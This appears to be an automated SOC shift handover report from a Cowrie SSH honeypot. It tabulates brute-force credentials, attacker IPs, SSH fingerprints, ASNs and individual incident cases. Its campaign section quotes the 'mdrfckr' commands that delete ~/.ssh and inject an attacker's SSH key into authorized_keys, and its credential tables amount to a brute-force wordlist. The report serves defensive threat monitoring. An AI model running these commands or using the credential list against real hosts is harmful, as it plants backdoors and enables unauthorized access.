# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-08 |
| **Generated At** | 2026-08-08T03:38:08Z |
| **Shift Time** | 03:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **304** |
| Confirmed Threats | **274** |
| False Positives Filtered | **30** (9.9%) |
| Unique Attacker IPs | **96** |
| Countries of Origin | **34** |
| High Severity Cases | **190** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **114** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **208** |
| Unique Credential Pairs | **174** |
| Unique Usernames | **104** |
| Unique Passwords | **137** |
| Successful Auth Pairs | **199** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 35 |
| `ubuntu` | 9 |
| `user` | 8 |
| `admin` | 7 |
| `test` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 15 |
| `password` | 6 |
| `1234` | 6 |
| `12345678` | 6 |
| `ADMIN` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `ADMIN` | 5 |
| `support` | `support` | 4 |
| `test` | `test1234` | 4 |
| `guest` | `1234` | 4 |
| `Test` | `test123` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `test1` | `123456789` | `77.239.124.246` | 2026-08-08T00:55:05 |
| `root` | `12345qwert` | `77.239.124.246` | 2026-08-08T00:55:10 |
| `root` | `Qq123456` | `77.239.124.246` | 2026-08-08T00:55:16 |
| `admin` | `password` | `77.239.124.246` | 2026-08-08T00:55:21 |
| `sonar` | `sonar` | `77.239.124.246` | 2026-08-08T00:55:26 |
| `developer` | `developer` | `77.239.124.246` | 2026-08-08T00:55:31 |
| `sol` | `Solana` | `45.148.10.240` | 2026-08-08T00:55:31 |
| `user` | `1` | `77.239.124.246` | 2026-08-08T00:55:37 |
| `user1` | `user1` | `77.239.124.246` | 2026-08-08T00:55:42 |
| `root` | `aB123456` | `77.239.124.246` | 2026-08-08T00:55:47 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-08T00:55:49 |
| `rocky` | `1234` | `77.239.124.246` | 2026-08-08T00:55:52 |
| `ivan` | `ivan` | `77.239.124.246` | 2026-08-08T00:55:57 |
| `root` | `qwe123!@#` | `77.239.124.246` | 2026-08-08T00:56:03 |
| `test` | `123456` | `77.239.124.246` | 2026-08-08T00:56:08 |
| `app` | `rootroot` | `77.239.124.246` | 2026-08-08T00:56:13 |
| `postgres` | `postgres` | `77.239.124.246` | 2026-08-08T00:56:18 |
| `user4` | `user4` | `77.239.124.246` | 2026-08-08T00:56:24 |
| `gitlab-runner` | `test` | `77.239.124.246` | 2026-08-08T00:56:29 |
| `ecommerce` | `ecommerce` | `77.239.124.246` | 2026-08-08T00:56:34 |
| `newuser` | `123` | `77.239.124.246` | 2026-08-08T00:56:40 |
| `nexus` | `pi` | `77.239.124.246` | 2026-08-08T00:56:45 |
| `root` | `qazwsx123` | `77.239.124.246` | 2026-08-08T00:56:51 |
| `root` | `!QAZ2wsx` | `77.239.124.246` | 2026-08-08T00:56:56 |
| `ubuntu` | `123321` | `77.239.124.246` | 2026-08-08T00:57:01 |
| `admin` | `ADMIN` | `10.0.0.73` | 2026-08-08T00:57:06 |
| `sol` | `solana` | `45.148.10.240` | 2026-08-08T00:57:07 |
| `teamspeak` | `raspberry` | `77.239.124.246` | 2026-08-08T00:57:08 |
| `user` | `password` | `77.239.124.246` | 2026-08-08T00:57:12 |
| `test1` | `test123` | `77.239.124.246` | 2026-08-08T00:57:17 |
| `git` | `dev` | `77.239.124.246` | 2026-08-08T00:57:23 |
| `vbox` | `123456` | `77.239.124.246` | 2026-08-08T00:57:28 |
| `root` | `Yun@wocloud.szkj` | `77.239.124.246` | 2026-08-08T00:57:34 |
| `kipt` | `kipt` | `77.239.124.246` | 2026-08-08T00:57:39 |
| `hamed` | `hamed` | `77.239.124.246` | 2026-08-08T00:57:45 |
| `odoo14` | `odoo14` | `77.239.124.246` | 2026-08-08T00:57:50 |
| `bot` | `root` | `77.239.124.246` | 2026-08-08T00:57:55 |
| `bernard` | `bernard` | `77.239.124.246` | 2026-08-08T00:58:00 |
| `nvidia` | `nvidia` | `77.239.124.246` | 2026-08-08T00:58:05 |
| `kim` | `kim123` | `77.239.124.246` | 2026-08-08T00:58:11 |
| `root` | `P@ssw0rd` | `77.239.124.246` | 2026-08-08T00:58:16 |
| `minecraft` | `1234` | `77.239.124.246` | 2026-08-08T00:58:21 |
| `root` | `null` | `77.239.124.246` | 2026-08-08T00:58:27 |
| `newuser` | `newuser` | `77.239.124.246` | 2026-08-08T00:58:32 |
| `admin` | `ADMIN` | `27.107.102.154` | 2026-08-08T00:58:35 |
| `sam` | `sam` | `77.239.124.246` | 2026-08-08T00:58:37 |
| `solana` | `solana` | `45.148.10.240` | 2026-08-08T00:58:39 |
| `root` | `Aa123123` | `77.239.124.246` | 2026-08-08T00:58:43 |
| `prefect` | `prefect` | `77.239.124.246` | 2026-08-08T00:58:48 |
| `root` | `102030` | `77.239.124.246` | 2026-08-08T00:58:53 |
| `root` | `eve` | `77.239.124.246` | 2026-08-08T00:58:58 |
| `test` | `passwd` | `77.239.124.246` | 2026-08-08T00:59:04 |
| `ducc0x` | `phuvanduc` | `77.239.124.246` | 2026-08-08T00:59:09 |
| `user` | `Aa123456` | `77.239.124.246` | 2026-08-08T00:59:15 |
| `dev` | `1qaz2wsx` | `77.239.124.246` | 2026-08-08T00:59:20 |
| `root` | `hello123` | `77.239.124.246` | 2026-08-08T00:59:25 |
| `fivem` | `12345` | `77.239.124.246` | 2026-08-08T00:59:31 |
| `supervisor` | `qwerty` | `185.255.212.178` | 2026-08-08T00:59:33 |
| `grok` | `12345678` | `77.239.124.246` | 2026-08-08T00:59:36 |
| `root` | `password` | `77.239.124.246` | 2026-08-08T00:59:41 |
| `openclaw` | `123456` | `77.239.124.246` | 2026-08-08T00:59:47 |
| `tactical` | `123456` | `77.239.124.246` | 2026-08-08T00:59:52 |
| `trade` | `123456` | `77.239.124.246` | 2026-08-08T00:59:58 |
| `admin` | `abc123` | `77.239.124.246` | 2026-08-08T01:00:03 |
| `webmaster` | `webmaster` | `77.239.124.246` | 2026-08-08T01:00:09 |
| `dev` | `123456` | `77.239.124.246` | 2026-08-08T01:00:13 |
| `solv` | `123456` | `45.148.10.240` | 2026-08-08T01:00:13 |
| `ubuntu` | `12345678` | `77.239.124.246` | 2026-08-08T01:00:18 |
| `root` | `Huawei@123` | `77.239.124.246` | 2026-08-08T01:00:24 |
| `karel` | `karel` | `77.239.124.246` | 2026-08-08T01:00:29 |
| `web` | `web123` | `77.239.124.246` | 2026-08-08T01:00:34 |
| `root` | `Ac123456` | `77.239.124.246` | 2026-08-08T01:00:39 |
| `deployer` | `user` | `77.239.124.246` | 2026-08-08T01:00:44 |
| `root` | `!QAZ2wsx3edc` | `77.239.124.246` | 2026-08-08T01:00:49 |
| `test_user` | `1` | `77.239.124.246` | 2026-08-08T01:00:54 |
| `csgo` | `csgo` | `77.239.124.246` | 2026-08-08T01:00:59 |
| `aaa` | `chris` | `77.239.124.246` | 2026-08-08T01:01:04 |
| `cloud-user` | `password` | `77.239.124.246` | 2026-08-08T01:01:09 |
| `root` | `root123` | `77.239.124.246` | 2026-08-08T01:01:15 |
| `ftp` | `ftp123` | `77.239.124.246` | 2026-08-08T01:01:20 |
| `dev` | `password` | `77.239.124.246` | 2026-08-08T01:01:25 |
| `odoo17` | `odoo` | `77.239.124.246` | 2026-08-08T01:01:30 |
| `rdpuser` | `123456` | `77.239.124.246` | 2026-08-08T01:01:36 |
| `deploy` | `toor` | `77.239.124.246` | 2026-08-08T01:01:41 |
| `mysql` | `mysql@1234` | `77.239.124.246` | 2026-08-08T01:01:46 |
| `oscar` | `oscar` | `77.239.124.246` | 2026-08-08T01:01:51 |
| `sniper` | `sniper` | `45.148.10.240` | 2026-08-08T01:01:53 |
| `runner` | `test` | `77.239.124.246` | 2026-08-08T01:01:56 |
| `support` | `support` | `176.53.159.196` | 2026-08-08T01:01:59 |
| `ansible` | `passwd` | `77.239.124.246` | 2026-08-08T01:02:01 |
| `cloud` | `Wangsu@2017` | `77.239.124.246` | 2026-08-08T01:02:07 |
| `work` | `work` | `77.239.124.246` | 2026-08-08T01:02:12 |
| `user1` | `123456` | `77.239.124.246` | 2026-08-08T01:02:17 |
| `splunk` | `password` | `77.239.124.246` | 2026-08-08T01:02:22 |
| `scraper` | `scraper` | `45.148.10.240` | 2026-08-08T01:03:35 |
| `solv` | `12345678` | `45.148.10.240` | 2026-08-08T01:05:13 |
| `hummingbot` | `hummingbot` | `45.148.10.240` | 2026-08-08T01:06:52 |
| `freqtrade` | `freqtrade` | `45.148.10.240` | 2026-08-08T01:08:30 |
| `ollama` | `ollama` | `45.148.10.240` | 2026-08-08T01:10:06 |
| `test` | `test1234` | `10.0.0.73` | 2026-08-08T01:10:54 |
| `jito` | `jito` | `45.148.10.240` | 2026-08-08T01:11:41 |
| `tensorflow` | `tensorflow` | `45.148.10.240` | 2026-08-08T01:13:17 |
| `admin` | `ADMIN` | `195.133.156.116` | 2026-08-08T01:14:43 |
| `admin` | `ADMIN` | `111.70.23.253` | 2026-08-08T01:14:56 |
| `oneadmin` | `opennebula` | `45.148.10.240` | 2026-08-08T01:14:57 |
| `root` | `eve` | `45.148.10.240` | 2026-08-08T01:16:36 |
| `gns3` | `gns3` | `45.148.10.240` | 2026-08-08T01:18:15 |
| `vyos` | `vyos` | `45.148.10.240` | 2026-08-08T01:19:58 |
| `tensor` | `tensor` | `45.148.10.240` | 2026-08-08T01:21:41 |
| `user` | `1` | `45.148.10.240` | 2026-08-08T01:23:18 |
| `user` | `123456` | `45.148.10.240` | 2026-08-08T01:24:53 |
| `support` | `support` | `10.0.0.73` | 2026-08-08T01:25:29 |
| `user1` | `user1` | `45.148.10.240` | 2026-08-08T01:26:31 |
| `john` | `john` | `45.148.10.240` | 2026-08-08T01:28:12 |
| `supervisor` | `qwerty` | `213.154.80.51` | 2026-08-08T01:28:24 |
| `test` | `test1234` | `119.200.229.33` | 2026-08-08T01:29:11 |
| `test` | `test1234` | `65.20.217.64` | 2026-08-08T01:29:23 |
| `test` | `test1234` | `170.233.29.157` | 2026-08-08T01:29:25 |
| `bonito` | `bonito` | `45.148.10.240` | 2026-08-08T01:29:48 |
| `support` | `654654` | `10.0.0.73` | 2026-08-08T01:31:09 |
| `nemo` | `nemo` | `45.148.10.240` | 2026-08-08T01:31:24 |
| `artemis` | `artemis` | `45.148.10.240` | 2026-08-08T01:33:07 |
| `root` | `letmein` | `65.20.187.47` | 2026-08-08T01:33:47 |
| `root` | `letmein` | `111.171.125.94` | 2026-08-08T01:34:00 |
| `asterisk` | `asterisk` | `45.148.10.240` | 2026-08-08T01:34:51 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-08T01:35:19 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-08T01:35:20 |
| `grid` | `grid` | `45.148.10.240` | 2026-08-08T01:36:32 |
| `erp` | `erp` | `45.148.10.240` | 2026-08-08T01:38:10 |
| `guest` | `guest2009` | `10.0.0.73` | 2026-08-08T01:38:14 |
| `erp` | `erp@123` | `45.148.10.240` | 2026-08-08T01:39:52 |
| `frappe` | `frappe@123` | `45.148.10.240` | 2026-08-08T01:41:33 |
| `frappe` | `frappe123` | `45.148.10.240` | 2026-08-08T01:43:09 |
| `frappe` | `123456` | `45.148.10.240` | 2026-08-08T01:44:47 |
| `root` | `letmein` | `10.0.0.73` | 2026-08-08T01:45:33 |
| `frappe` | `12345678` | `45.148.10.240` | 2026-08-08T01:46:29 |
| `claude` | `claude` | `45.148.10.240` | 2026-08-08T01:48:13 |
| `support` | `654654` | `207.219.222.29` | 2026-08-08T01:49:09 |
| `codex` | `codex` | `45.148.10.240` | 2026-08-08T01:49:55 |
| `gemini` | `gemini` | `45.148.10.240` | 2026-08-08T01:51:39 |
| `ubuntu` | `ubuntu` | `45.148.10.240` | 2026-08-08T01:53:24 |
| `ubuntu` | `ubuntu@123` | `45.148.10.240` | 2026-08-08T01:55:04 |
| `ubuntu` | `qwer1234` | `45.148.10.240` | 2026-08-08T01:56:41 |
| `user` | `user2017` | `179.184.218.49` | 2026-08-08T01:57:19 |
| `ubuntu` | `1234qwer` | `45.148.10.240` | 2026-08-08T01:58:22 |
| `ubuntu` | `1q2w3e4r` | `45.148.10.240` | 2026-08-08T02:00:06 |
| `user` | `user2017` | `10.0.0.73` | 2026-08-08T02:00:49 |
| `ubuntu` | `p@ssw0rd` | `45.148.10.240` | 2026-08-08T02:01:48 |
| `ubuntu` | `!@#$%^` | `45.148.10.240` | 2026-08-08T02:03:31 |
| `root` | `blockchain1!` | `45.148.10.240` | 2026-08-08T02:05:17 |
| `guest` | `1234` | `65.181.79.60` | 2026-08-08T02:06:52 |
| `sol-docker` | `sol-docker` | `45.148.10.240` | 2026-08-08T02:07:01 |
| `guest` | `1234` | `41.178.230.115` | 2026-08-08T02:07:04 |
| `soldocker` | `soldocker` | `45.148.10.240` | 2026-08-08T02:08:40 |
| `debian` | `123456` | `77.90.185.20` | 2026-08-08T02:09:58 |
| `solana` | `postgres` | `45.148.10.240` | 2026-08-08T02:10:19 |
| `postgres` | `solana` | `45.148.10.240` | 2026-08-08T02:12:03 |
| `root` | `solana1!` | `45.148.10.240` | 2026-08-08T02:13:46 |
| `Test` | `test123` | `10.0.0.73` | 2026-08-08T02:15:19 |
| `root` | `Solana1!` | `45.148.10.240` | 2026-08-08T02:15:29 |
| `root` | `Solana!` | `45.148.10.240` | 2026-08-08T02:17:15 |
| `root` | `solana1` | `45.148.10.240` | 2026-08-08T02:19:05 |
| `root` | `linux` | `10.0.0.73` | 2026-08-08T02:19:44 |
| `ubnt` | `ubnt2004` | `101.13.5.26` | 2026-08-08T02:20:08 |
| `solana` | `solana1!` | `45.148.10.240` | 2026-08-08T02:20:48 |
| `root` | `asd12345` | `177.128.224.122` | 2026-08-08T02:22:26 |
| `345gs5662d34` | `345gs5662d34` | `177.128.224.122` | 2026-08-08T02:22:29 |
| `solana` | `Solana1!` | `45.148.10.240` | 2026-08-08T02:22:29 |
| `root` | `3245gs5662d34` | `177.128.224.122` | 2026-08-08T02:22:30 |
| `guest` | `1234` | `14.54.22.11` | 2026-08-08T02:22:59 |
| `guest` | `1234` | `103.93.37.178` | 2026-08-08T02:23:07 |
| `ubnt` | `ubnt2004` | `77.106.78.215` | 2026-08-08T02:23:21 |
| `ubnt` | `ubnt2004` | `210.222.70.61` | 2026-08-08T02:23:30 |
| `ubnt` | `ubnt2004` | `10.0.0.73` | 2026-08-08T02:23:46 |
| `defi` | `defi` | `45.148.10.240` | 2026-08-08T02:24:11 |
| `user1` | `123456` | `45.148.10.240` | 2026-08-08T02:25:53 |
| `steam` | `asdf1234` | `125.88.225.11` | 2026-08-08T02:26:09 |
| `345gs5662d34` | `345gs5662d34` | `125.88.225.11` | 2026-08-08T02:26:13 |
| `steam` | `3245gs5662d34` | `125.88.225.11` | 2026-08-08T02:26:14 |
| `user1` | `12345678` | `45.148.10.240` | 2026-08-08T02:27:30 |
| `user2` | `123456` | `45.148.10.240` | 2026-08-08T02:29:12 |
| `user2` | `12345678` | `45.148.10.240` | 2026-08-08T02:30:59 |
| `geth` | `geth` | `45.148.10.240` | 2026-08-08T02:32:45 |
| `Test` | `test123` | `65.20.134.97` | 2026-08-08T02:34:06 |
| `Test` | `test123` | `180.76.104.208` | 2026-08-08T02:34:19 |
| `ethereum` | `ethereum` | `45.148.10.240` | 2026-08-08T02:34:27 |
| `eth` | `eth` | `45.148.10.240` | 2026-08-08T02:36:11 |
| `eth-docker` | `eth-docker` | `45.148.10.240` | 2026-08-08T02:37:55 |
| `root` | `rootpasswd` | `10.0.0.73` | 2026-08-08T02:39:34 |
| `eth` | `docker` | `45.148.10.240` | 2026-08-08T02:39:35 |
| `eth` | `test` | `45.148.10.240` | 2026-08-08T02:41:14 |
| `root` | `p@ssw0rd` | `61.184.128.210` | 2026-08-08T02:42:25 |
| `sol` | `test` | `45.148.10.240` | 2026-08-08T02:42:59 |
| `guest` | `guest2021` | `178.178.222.55` | 2026-08-08T02:43:01 |
| `validator` | `validator` | `45.148.10.240` | 2026-08-08T02:46:30 |
| `node` | `node` | `45.148.10.240` | 2026-08-08T02:48:13 |
| `operator` | `operator` | `45.148.10.240` | 2026-08-08T02:50:00 |
| `trader` | `trader` | `45.148.10.240` | 2026-08-08T02:51:43 |
| `trading` | `trading` | `45.148.10.240` | 2026-08-08T02:53:22 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **304** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 165 |
| OpenSSH | 32 |
| libssh | 13 |
| Paramiko (Python) | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 85 | 2 |
| `16443846184e...` | Generic scanner | 74 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 26 | 26 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `a984ff804585...` | libssh-based | 5 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 85 | 2 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 74 | 2 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 26 | 26 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 3 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `a2de0f306611...` | Paramiko (Python) | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `177.128.224.122`, `125.88.225.11`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **96** |
| Unique ASNs | **72** |
| High-Risk ASNs | **55** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 7 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS48721` | Flyservers S.A. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (190)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-659383c2aed4

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:05` | `cowrie.session.connect` |
| `2026-08-08 00:55:05` | `cowrie.client.version` |
| `2026-08-08 00:55:05` | `cowrie.client.kex` |
| `2026-08-08 00:55:05` | `cowrie.login.success` |
| `2026-08-08 00:55:06` | `cowrie.session.params` |
| `2026-08-08 00:55:06` | `cowrie.command.input` |
| `2026-08-08 00:55:06` | `cowrie.log.closed` |
| `2026-08-08 00:55:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3153b41fdd1

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:10` | `cowrie.session.connect` |
| `2026-08-08 00:55:10` | `cowrie.client.version` |
| `2026-08-08 00:55:10` | `cowrie.client.kex` |
| `2026-08-08 00:55:10` | `cowrie.login.success` |
| `2026-08-08 00:55:11` | `cowrie.session.params` |
| `2026-08-08 00:55:11` | `cowrie.command.input` |
| `2026-08-08 00:55:11` | `cowrie.log.closed` |
| `2026-08-08 00:55:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63764c4cc5e0

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:15` | `cowrie.session.connect` |
| `2026-08-08 00:55:15` | `cowrie.client.version` |
| `2026-08-08 00:55:15` | `cowrie.client.kex` |
| `2026-08-08 00:55:16` | `cowrie.login.success` |
| `2026-08-08 00:55:16` | `cowrie.session.params` |
| `2026-08-08 00:55:16` | `cowrie.command.input` |
| `2026-08-08 00:55:17` | `cowrie.log.closed` |
| `2026-08-08 00:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b156c7dac0a9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:20` | `cowrie.session.connect` |
| `2026-08-08 00:55:20` | `cowrie.client.version` |
| `2026-08-08 00:55:20` | `cowrie.client.kex` |
| `2026-08-08 00:55:21` | `cowrie.login.success` |
| `2026-08-08 00:55:22` | `cowrie.session.params` |
| `2026-08-08 00:55:22` | `cowrie.command.input` |
| `2026-08-08 00:55:22` | `cowrie.log.closed` |
| `2026-08-08 00:55:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8154eb472daa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:26` | `cowrie.session.connect` |
| `2026-08-08 00:55:26` | `cowrie.client.version` |
| `2026-08-08 00:55:26` | `cowrie.client.kex` |
| `2026-08-08 00:55:26` | `cowrie.login.success` |
| `2026-08-08 00:55:27` | `cowrie.session.params` |
| `2026-08-08 00:55:27` | `cowrie.command.input` |
| `2026-08-08 00:55:27` | `cowrie.log.closed` |
| `2026-08-08 00:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92d03b2c983c

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:31` | `cowrie.session.connect` |
| `2026-08-08 00:55:31` | `cowrie.client.version` |
| `2026-08-08 00:55:31` | `cowrie.client.kex` |
| `2026-08-08 00:55:31` | `cowrie.login.success` |
| `2026-08-08 00:55:32` | `cowrie.session.params` |
| `2026-08-08 00:55:32` | `cowrie.command.input` |
| `2026-08-08 00:55:33` | `cowrie.log.closed` |
| `2026-08-08 00:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73f54024e3b7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:31` | `cowrie.session.connect` |
| `2026-08-08 00:55:31` | `cowrie.client.version` |
| `2026-08-08 00:55:31` | `cowrie.client.kex` |
| `2026-08-08 00:55:31` | `cowrie.login.success` |
| `2026-08-08 00:55:33` | `cowrie.session.params` |
| `2026-08-08 00:55:33` | `cowrie.command.input` |
| `2026-08-08 00:55:33` | `cowrie.log.closed` |
| `2026-08-08 00:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561ef8c49ce7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-08-08 00:55 |
| **Last Seen** | 2026-08-08 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 00:55:36` | `cowrie.session.connect` |
| `2026-08-08 00:55:36` | `cowrie.client.version` |
| `2026-08-08 00:55:36` | `cowrie.client.kex` |
| `2026-08-08 00:55:37` | `cowrie.login.success` |
| `2026-08-08 00:55:37` | `cowrie.session.params` |
| `2026-08-08 00:55:37` | `cowrie.command.input` |
| `2026-08-08 00:55:37` | `cowrie.log.closed` |
